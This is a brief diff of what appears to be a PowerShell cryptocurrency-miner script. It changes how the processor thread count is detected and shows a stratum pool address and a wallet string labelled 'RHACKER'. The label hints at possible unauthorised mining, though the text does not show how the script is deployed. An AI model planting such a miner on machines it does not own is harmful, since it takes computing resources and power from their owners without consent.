@@ -1,4 +1,4 @@
-$threads = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
+$threads = (Get-CimInstance -ClassName Win32_Processor).NumberOfLogicalProcessors
 $algorithm = "verus"
 $server = "stratum+tcp://verus.farm:9999"
 $user = "RHACKERwSVgjTvV4vNiTjmrkLTD7a92ALD.Triage"
